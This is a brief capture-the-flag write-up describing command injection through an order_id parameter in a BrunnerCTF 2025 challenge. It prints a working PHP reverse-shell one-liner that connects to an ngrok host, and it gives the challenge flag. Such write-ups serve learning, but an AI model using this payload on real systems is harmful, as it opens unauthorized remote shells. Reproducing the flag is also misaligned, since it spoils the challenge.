There is a command injection in the `order_id` GET parameter.  You can read `index.php` to find the actual injection point.

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/caffeine-injection.png)

I used a PHP reverse shell to get shell as user.
```
php -r '$sock=fsockopen("0.tcp.ap.ngrok.io",18271);exec("/bin/bash <&3 >&3 2>&3");'
```

Flag: `brunner{C0Ff33_w1Th_4_51d3_0F_c0MM4nD_1nj3Ct10n!}`


Solved by: benkyou